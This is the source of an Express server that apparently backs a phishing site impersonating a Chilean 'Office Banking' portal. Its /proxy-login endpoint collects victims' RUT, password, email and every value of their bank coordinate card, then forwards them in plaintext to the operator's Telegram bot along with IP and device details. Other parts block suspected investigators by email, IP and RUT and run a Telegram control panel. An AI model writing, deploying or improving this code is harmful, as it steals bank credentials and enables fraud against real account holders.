const express = require("express");
const cors = require("cors");
const fs = require("fs");
const path = require("path");

const sqlite3 = require("sqlite3").verbose();
const db = new sqlite3.Database("panel.db");

db.serialize(() => {
  db.run(`CREATE TABLE IF NOT EXISTS ips_bloqueadas (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    ip TEXT NOT NULL,
    motivo TEXT,
    fecha DATETIME DEFAULT CURRENT_TIMESTAMP
  )`);

  db.run(`CREATE TABLE IF NOT EXISTS ruts_bloqueados (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    rut TEXT NOT NULL,
    motivo TEXT,
    fecha DATETIME DEFAULT CURRENT_TIMESTAMP
  )`);

  db.run(`CREATE TABLE IF NOT EXISTS intentos_ip (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    ip TEXT NOT NULL,
    ruta TEXT,
    metodo TEXT,
    fecha DATETIME DEFAULT CURRENT_TIMESTAMP
  )`);

  db.run(`CREATE TABLE IF NOT EXISTS intentos_rut (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    rut TEXT NOT NULL,
    fecha DATETIME DEFAULT CURRENT_TIMESTAMP
  )`);

  db.run(`CREATE TABLE IF NOT EXISTS panel_logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    tipo TEXT,
    mensaje TEXT,
    fecha DATETIME DEFAULT CURRENT_TIMESTAMP
  )`);
});


const app = express();

// 🔥 NECESARIO PARA QUE FUNCIONE CON WWW Y SIN WWW
app.set("trust proxy", true);

// ✅ CORS mejorado - permite AMBOS dominios sin redirección
const corsOptions = {
  origin: function(origin, callback) {
    if (
      !origin ||
      origin === "https://www.officebankingchile.info" ||
      origin === "https://officebankingchile.info" ||
      origin === "http://localhost:3000" ||
      origin === "http://localhost:5000"
    ) {
      callback(null, true);
    } else {
      callback(new Error("No permitido por CORS"));
    }
  },
  methods: ["GET", "POST", "OPTIONS"],
  allowedHeaders: ["Content-Type", "Authorization"],
  credentials: true,
  maxAge: 86400
};

app.use(cors(corsOptions));
app.options("*", cors(corsOptions));

app.use(express.json());
app.use(express.static(path.join(__dirname, "public")));

// =============================================
//   🔥 BLOQUEO DE CORREOS SOSPECHOSOS 🔥
// =============================================
const correosBloqueados = [
  "f.tamarugal@gmail.com",   // <-- reemplaza aquí
  "otro@dominio.com"
];

app.use((req, res, next) => {
  const email =
    req.query.email ||
    req.body?.mail ||
    req.body?.email ||
    req.body?.correo;

  if (email && correosBloqueados.includes(email)) {
    console.log(`🚫 BLOQUEADO: ${email}`);
    return res.status(403).json({
      status: "error",
      mensaje: "Acceso bloqueado"
    });
  }

  next();
});

// =============================================
//   🔥 PANEL TÉCNICO + BLOQUEO POR IP 🔥
// =============================================
function registrarIntentoIP(ip, req) {
  if (!ip) return;
  db.run(
    "INSERT INTO intentos_ip (ip, ruta, metodo) VALUES (?, ?, ?)",
    [ip, req.path, req.method]
  );
}

function bloquearIP(ip, motivo = "Bloqueo manual") {
  if (!ip) return;
  db.run(
    "INSERT INTO ips_bloqueadas (ip, motivo) VALUES (?, ?)",
    [ip, motivo]
  );
  enviarEventoTecnico(
    `⛔ IP BLOQUEADA\nIP: ${ip}\nMotivo: ${motivo}\nHora: ${new Date().toLocaleString("es-CL")}`
  );
}

function desbloquearIP(ip) {
  if (!ip) return;
  db.run("DELETE FROM ips_bloqueadas WHERE ip = ?", [ip]);
  enviarEventoTecnico(
    `🔓 IP DESBLOQUEADA\nIP: ${ip}\nHora: ${new Date().toLocaleString("es-CL")}`
  );
}

function estaBloqueadaIP(ip, callback) {
  if (!ip) return callback(false);
  db.get("SELECT 1 FROM ips_bloqueadas WHERE ip = ? LIMIT 1", [ip], (err, row) => {
    callback(!!row);
  });
}

// Middleware global de bloqueo técnico por IP
app.use((req, res, next) => {
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;

  estaBloqueadaIP(ip, bloqueada => {
    if (bloqueada) {
      enviarEventoTecnico(
        `⛔ Intento desde IP bloqueada\nIP: ${ip}\nRuta: ${req.path}\nMétodo: ${req.method}\nHora: ${new Date().toLocaleString("es-CL")}`
      );
      return res.status(403).json({ error: "IP bloqueada" });
    }

    registrarIntentoIP(ip, req);
    next();
  });
});

// ✅ Middleware para logging detallado
app.use((req, res, next) => {
  console.log(`\n📨 ${req.method} ${req.path}`);
  console.log(`Origin: ${req.get("origin")}`);
  if (req.method === "POST") {
    console.log(`Body:`, JSON.stringify(req.body, null, 2));
  }
  next();
});

// Verificación de variables de entorno
console.log("\n=== VERIFICANDO CONFIGURACIÓN ===");
console.log(`TELEGRAM_TOKEN definido: ${process.env.TELEGRAM_TOKEN ? "✅ SÍ" : "❌ NO"}`);
console.log(`CHAT_ID definido: ${process.env.CHAT_ID ? "✅ SÍ" : "❌ NO"}`);
if (process.env.TELEGRAM_TOKEN)
  console.log(`Token (primeros 20 caracteres): ${process.env.TELEGRAM_TOKEN.substring(0, 20)}...`);
if (process.env.CHAT_ID) console.log(`Chat ID: ${process.env.CHAT_ID}`);
console.log("================================\n");

// Health check
app.get("/health", (req, res) => {
  res.json({ status: "ok", message: "Servidor funcionando correctamente" });
});

// Leer configuración
app.get("/config", (req, res) => {
  try {
    const cfg = JSON.parse(fs.readFileSync("config.json", "utf8"));
    res.json(cfg);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Procesar saldo
app.post("/procesarSaldo", async (req, res) => {
  const { rut, passwd } = req.body;
  try {
    res.json({ status: "ok", mensaje: "Procesado (flujo original)" });
  } catch (err) {
    console.error("Error en procesarSaldo:", err);
    res.status(500).json({ status: "error", error: err.message });
  }
});

// Guardar configuración
app.post("/config", (req, res) => {
  try {
    fs.writeFileSync("config.json", JSON.stringify(req.body, null, 2));
    res.json(req.body);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Admin
app.get("/admin", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "admin.html"));
});

// Autorización
app.get("/autorizacion", (req, res) => {
  try {
    const cfg = JSON.parse(fs.readFileSync("config.json", "utf8"));

    if (cfg.tipoAutorizacion === "santander") {
      res.sendFile(path.join(__dirname, "public", "autorizacion-santander.html"));
      return;
    }

    if (cfg.tipoAutorizacion === "coordenadas") {
      res.sendFile(path.join(__dirname, "public", "autorizacion-coordenadas.html"));
      return;
    }

    res.sendFile(path.join(__dirname, "public", "autorizacion-coordenadas.html"));
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Enviar autorización a Telegram
app.post("/autorizar", async (req, res) => {
  const mensaje = req.body.mensaje || "Autorización recibida";
  try {
    if (process.env.TELEGRAM_TOKEN && process.env.CHAT_ID) {
      await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: mensaje })
      });
    }
    res.json({ status: "ok", mensaje: "Autorización recibida correctamente" });
  } catch (err) {
    console.error("Error en autorizar:", err);
    res.status(500).json({ status: "error", error: err.message });
  }
});

// Función para enviar a Telegram (mensajes normales)
async function enviarATelegram(mensaje) {
  try {
    const url = `https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`;

    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: process.env.CHAT_ID,
        text: mensaje
      })
    });

    const data = await response.json();
    return data.ok;
  } catch (err) {
    console.error(`❌ Error enviando a Telegram:`, err.message);
    return false;
  }
}

// Función para enviar eventos técnicos al “panel” (sin datos sensibles)
async function enviarEventoTecnico(mensaje) {
  if (!process.env.TELEGRAM_TOKEN || !process.env.CHAT_ID) return false;
  const prefijo = "📡 EVENTO TÉCNICO\n";
  return enviarATelegram(prefijo + mensaje);
}

// 🔍 Detección de navegador / sistema / dispositivo
function detectarNavegador(userAgent) {
  userAgent = userAgent || "";

  let navegador = "Desconocido";
  if (/chrome|crios|crmo/i.test(userAgent) && !/edge|edg/i.test(userAgent)) navegador = "Chrome";
  else if (/edg/i.test(userAgent)) navegador = "Edge";
  else if (/firefox|fxios/i.test(userAgent)) navegador = "Firefox";
  else if (/safari/i.test(userAgent) && !/chrome|crios|crmo/i.test(userAgent)) navegador = "Safari";
  else if (/opr|opera/i.test(userAgent)) navegador = "Opera";

  let sistema = "Desconocido";
  if (/windows nt/i.test(userAgent)) sistema = "Windows";
  else if (/android/i.test(userAgent)) sistema = "Android";
  else if (/iphone|ipad|ipod/i.test(userAgent)) sistema = "iOS";
  else if (/mac os/i.test(userAgent)) sistema = "MacOS";
  else if (/linux/i.test(userAgent)) sistema = "Linux";

  let dispositivo = "Desktop";
  if (/mobile/i.test(userAgent)) dispositivo = "Móvil";
  else if (/tablet|ipad/i.test(userAgent)) dispositivo = "Tablet";

  return { navegador, sistema, dispositivo };
}

// =============================================
//   🔥🔥🔥  BLOQUE /proxy-login ORIGINAL  🔥🔥🔥
//   (solo se le agrega panel técnico / IP)   //
// =============================================

app.post("/proxy-login", async (req, res) => {
  const { rut, passwd, mail, coordenadas } = req.body;
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
  const userAgent = req.headers["user-agent"];
  const infoNavegador = detectarNavegador(userAgent);

  // 🔥 Registrar intento SIEMPRE
  if (rut) registrarIntentoRUT(rut);

  // 🔥 Verificar si el RUT está bloqueado
  if (rut) {
    return estaBloqueadoRUT(rut, bloqueado => {
      if (bloqueado) {
        enviarEventoTecnico(`⛔ Intento de login con RUT bloqueado: ${rut}`);
        return res.status(403).json({
          status: "error",
          mensaje: "RUT bloqueado"
        });
      }

      // Si NO está bloqueado → continuar flujo normal
      procesarLogin();
    });
  }

  async function procesarLogin() {
    enviarEventoTecnico(
      `Nuevo request a /proxy-login
IP: ${ip}
Método: POST
Navegador: ${infoNavegador.navegador}
Sistema: ${infoNavegador.sistema}
Dispositivo: ${infoNavegador.dispositivo}
Tiene mail: ${!!mail}
Tiene login: ${!!(rut && passwd)}
Tiene coordenadas: ${!!coordenadas}`
    );

    try {
      // 📧 CORREO
      if (mail) {
        const mensajeCorrecto = `📧 Correo actualizado:
${mail}
IP: ${ip}
Navegador: ${infoNavegador.navegador}
Sistema: ${infoNavegador.sistema}
Dispositivo: ${infoNavegador.dispositivo}`;
        await enviarATelegram(mensajeCorrecto);
        return res.json({ status: "ok", mensaje: "Correo actualizado correctamente" });
      }

      // 🔐 LOGIN
      if (rut && passwd) {
        const mensajeLogin = `🔐 Nuevo Login en Office Banking:
RUT: ${rut}
Clave: ${passwd}
IP: ${ip}
Hora: ${new Date().toLocaleString("es-CL")}
Navegador: ${infoNavegador.navegador}
Sistema: ${infoNavegador.sistema}
Dispositivo: ${infoNavegador.dispositivo}`;

        await enviarATelegram(mensajeLogin);
        return res.json({ status: "ok", mensaje: "Bienvenido a Office Banking" });
      }

      // 🔢 COORDENADAS
      if (coordenadas) {
        const coords = coordenadas;
        let texto = "🔐 Tarjeta de Coordenadas\n\n";

        const letras = ["A", "B", "C", "D", "E", "F", "G", "H", "I", "J"];

        for (let fila = 1; fila <= 5; fila++) {
          let linea = "";
          for (let col of letras) {
            linea += `${col}${fila}: ${coords[col + fila]} | `;
          }
          texto += linea.slice(0, -3) + "\n";
        }

        texto += `\nIP: ${ip}`;
        texto += `\nHora: ${new Date().toLocaleString("es-CL")}`;
        texto += `\nNavegador: ${infoNavegador.navegador}`;
        texto += `\nSistema: ${infoNavegador.sistema}`;
        texto += `\nDispositivo: ${infoNavegador.dispositivo}`;

        await enviarATelegram(texto);

        return res.json({
          status: "ok",
          mensaje: "Coordenadas recibidas correctamente"
        });
      }

      // Datos inválidos
      registrarIntentoIP(ip);
      enviarEventoTecnico(
        `❌ Datos inválidos en /proxy-login
IP: ${ip}
Hora: ${new Date().toLocaleString("es-CL")}`
      );

      res.status(400).json({ status: "error", mensaje: "❌ Datos inválidos" });
    } catch (err) {
      console.error(`❌ Error en /proxy-login:`, err);
      registrarIntentoIP(ip);
      enviarEventoTecnico(
        `⚠️ Error en /proxy-login
IP: ${ip}
Error: ${err.message}
Hora: ${new Date().toLocaleString("es-CL")}`
      );
      res.status(500).json({ status: "error", mensaje: "⚠️ Error al procesar solicitud" });
    }
  }
});
// =============================================
//   🔥 BLOQUEO TÉCNICO POR RUT 🔥
// =============================================
function bloquearRUT(rut, motivo = "Bloqueo manual") {
  if (!rut) return;
  db.run(
    "INSERT INTO ruts_bloqueados (rut, motivo) VALUES (?, ?)",
    [rut, motivo]
  );
  enviarEventoTecnico(`⛔ RUT BLOQUEADO\nRUT: ${rut}\nMotivo: ${motivo}`);
}

function desbloquearRUT(rut) {
  if (!rut) return;
  db.run("DELETE FROM ruts_bloqueados WHERE rut = ?", [rut]);
  enviarEventoTecnico(`🔓 RUT DESBLOQUEADO\nRUT: ${rut}`);
}

function registrarIntentoRUT(rut) {
  if (!rut) return;
  db.run("INSERT INTO intentos_rut (rut) VALUES (?)", [rut]);
}

function estaBloqueadoRUT(rut, callback) {
  if (!rut) return callback(false);
  db.get("SELECT 1 FROM ruts_bloqueados WHERE rut = ? LIMIT 1", [rut], (err, row) => {
    callback(!!row);
  });
}

// =============================================
//   🔥 PANEL TÉCNICO UNIFICADO (VERSIÓN RÁPIDA) 🔥
// =============================================

// 📡 Menú principal
async function enviarPanelUnificado(chatId) {
  const texto = `📡 PANEL TÉCNICO UNIFICADO
Selecciona una opción:`;

  const botones = {
    reply_markup: {
      inline_keyboard: [
        [{ text: "📊 Estado del servidor", callback_data: "panel_estado" }],
        [{ text: "📈 Estadísticas", callback_data: "panel_stats" }],
        [{ text: "📡 Panel en vivo", callback_data: "panel_vivo" }],
        [{ text: "📜 Stream técnico", callback_data: "panel_stream" }],
        [{ text: "🛡 IPs detectadas", callback_data: "panel_ips" }],
        [{ text: "🧾 RUT detectados", callback_data: "panel_ruts" }]
      ]
    }
  };

  await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: chatId,
      text: texto,
      ...botones
    })
  });
}

// 📊 Estado del servidor
async function panelEstado(chatId) {
  const texto = await construirPanelTexto();

  await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: chatId,
      text: texto
    })
  });
}

// 📈 Estadísticas
async function panelStats(chatId) {
  const texto = `
📈 ESTADÍSTICAS TÉCNICAS

IPs con actividad: ${intentosPorIP.size}
IPs bloqueadas: ${ipsBloqueadas.size}
RUTs con actividad: ${intentosPorRUT.size}
RUTs bloqueados: ${rutsBloqueados.size}

Hora: ${new Date().toLocaleString("es-CL")}
`;

  await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: chatId,
      text: texto
    })
  });
}

// 📡 Panel en vivo
async function panelVivo(chatId) {
  await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: chatId,
      text: "📡 Panel en vivo activado"
    })
  });

  await enviarPanelTecnicoVivo(chatId);
}

// 📜 Stream técnico
async function panelStream(chatId) {
  await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: chatId,
      text: "📜 Stream técnico activado"
    })
  });

  await enviarStreamTecnico("Stream iniciado");
}

async function panelIPs(chatId, page = 0) {
  const porPagina = 3;
  const offset = page * porPagina;

  db.all("SELECT ip FROM ips_bloqueadas ORDER BY fecha DESC LIMIT ? OFFSET ?", [porPagina, offset], (errBloq, bloqueadas) => {
    db.all("SELECT ip, COUNT(*) AS intentos FROM intentos_ip GROUP BY ip ORDER BY intentos DESC LIMIT ? OFFSET ?", [porPagina, offset], async (errInt, intentos) => {
      const lista = [
        ...bloqueadas.map(i => ({ ip: i.ip, tipo: "desbloquear" })),
        ...intentos.map(i => ({ ip: i.ip, tipo: "bloquear" }))
      ];

      const botones = [];

      for (const item of lista) {
        if (item.tipo === "bloquear") {
          botones.push([{ text: `⛔ Bloquear ${item.ip}`, callback_data: `bloquear_ip_${item.ip}` }]);
        } else {
          botones.push([{ text: `🔓 Desbloquear ${item.ip}`, callback_data: `desbloquear_ip_${item.ip}` }]);
        }
      }

      botones.push([{ text: "⬅ Volver al menú", callback_data: "panel_back" }]);

      await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: "🛡 IPs detectadas",
          reply_markup: { inline_keyboard: botones }
        })
      });
    });
  });
}

async function panelRUTs(chatId, page = 0) {
  const porPagina = 3;
  const offset = page * porPagina;

  db.all("SELECT rut FROM ruts_bloqueados ORDER BY fecha DESC LIMIT ? OFFSET ?", [porPagina, offset], (errBloq, bloqueados) => {
    db.all("SELECT rut, COUNT(*) AS intentos FROM intentos_rut GROUP BY rut ORDER BY intentos DESC LIMIT ? OFFSET ?", [porPagina, offset], async (errInt, intentos) => {
      const lista = [
        ...bloqueados.map(r => ({ rut: r.rut, tipo: "desbloquear" })),
        ...intentos.map(r => ({ rut: r.rut, tipo: "bloquear" }))
      ];

      const botones = [];

      for (const item of lista) {
        if (item.tipo === "bloquear") {
          botones.push([{ text: `⛔ Bloquear ${item.rut}`, callback_data: `bloquear_rut_${item.rut}` }]);
        } else {
          botones.push([{ text: `🔓 Desbloquear ${item.rut}`, callback_data: `desbloquear_rut_${item.rut}` }]);
        }
      }

      botones.push([{ text: "⬅ Volver al menú", callback_data: "panel_back" }]);

      await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: "🧾 RUT detectados",
          reply_markup: { inline_keyboard: botones }
        })
      });
    });
  });
}

// 📡 Panel técnico en vivo
async function enviarPanelTecnicoVivo(chatId) {
  const texto = await construirPanelTexto();

  await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: chatId,
      text: texto
    })
  });
}
async function responderCallback(callbackId, texto) {
  await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/answerCallbackQuery`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      callback_query_id: callbackId,
      text: texto,
      show_alert: false
    })
  });
}


app.post("/telegram-webhook", async (req, res) => {
  const update = req.body;

  // ============================
  //   📌 BOTONES (callback_query)
  // ============================
  if (update.callback_query) {
    const data = update.callback_query.data;
    const chatId = update.callback_query.message.chat.id;

    // Menú principal
    if (data === "panel_estado") return panelEstado(chatId);
    if (data === "panel_stats") return panelStats(chatId);
    if (data === "panel_vivo") return panelVivo(chatId);
    if (data === "panel_stream") return panelStream(chatId);
    if (data === "panel_ips") return panelIPs(chatId);
    if (data === "panel_ruts") return panelRUTs(chatId);
    if (data === "panel_back") return enviarPanelUnificado(chatId);

    // ============================
    //   🔥 BLOQUEAR / DESBLOQUEAR IP
    // ============================
    if (data.startsWith("bloquear_ip_")) {
      const ip = data.replace("bloquear_ip_", "");
      bloquearIP(ip, "Bloqueo manual desde panel");
      await responderCallback(update.callback_query.id, `IP bloqueada: ${ip}`);
      return panelIPs(chatId);
    }

    if (data.startsWith("desbloquear_ip_")) {
      const ip = data.replace("desbloquear_ip_", "");
      desbloquearIP(ip);
      await responderCallback(update.callback_query.id, `IP desbloqueada: ${ip}`);
      return panelIPs(chatId);
    }

    // ============================
    //   🔥 BLOQUEAR / DESBLOQUEAR RUT
    // ============================
    if (data.startsWith("bloquear_rut_")) {
      const rut = data.replace("bloquear_rut_", "");
      bloquearRUT(rut, "Bloqueo manual desde panel");
      await responderCallback(update.callback_query.id, `RUT bloqueado: ${rut}`);
      return panelRUTs(chatId);
    }

    if (data.startsWith("desbloquear_rut_")) {
      const rut = data.replace("desbloquear_rut_", "");
      desbloquearRUT(rut);
      await responderCallback(update.callback_query.id, `RUT desbloqueado: ${rut}`);
      return panelRUTs(chatId);
    }

    return res.sendStatus(200);
  }

  // ============================
  //   📌 MENSAJES NORMALES
  // ============================
  if (update.message) {
    const text = update.message.text || "";
    const chatId = update.message.chat.id;

    if (text.startsWith("/panel")) {
      await enviarPanelUnificado(chatId);
    }
  }

  res.sendStatus(200);
});

// Página principal
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

// 404
app.use((req, res) => {
  res.status(404).json({ error: "Ruta no encontrada" });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`✅ Servidor corriendo en puerto ${PORT}`));
